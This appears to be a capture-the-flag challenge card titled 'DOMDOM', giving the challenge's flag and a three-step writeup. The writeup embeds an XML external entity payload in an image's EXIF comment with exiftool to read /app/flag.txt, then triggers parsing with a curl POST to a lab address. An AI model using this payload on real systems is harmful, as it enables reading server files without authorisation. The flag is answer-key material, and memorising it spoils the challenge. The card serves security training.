## DOMDOM
I love face-book and I love to share my photos with my friends.

### Description

### Difficulty
6./10

### Flag
PCTF{Y0u_D00m3D_U5_Man_So_SAD}

### Hints


### Author
Kiran Ghimire (sau)

### Tester

### Writeup
1. `exiftool -Comment="<?xml version='1.0'?><\!DOCTYPE root [<\!ENTITY test SYSTEM 'file:///app/flag.txt'>]><root>&test;</root>" test.png`
2. Upload the image file
3. `curl 'http://172.17.0.2:9090/check' -X POST -d 'url=http://172.17.0.2:9090/meta?image=imagename.png<random_num>'`
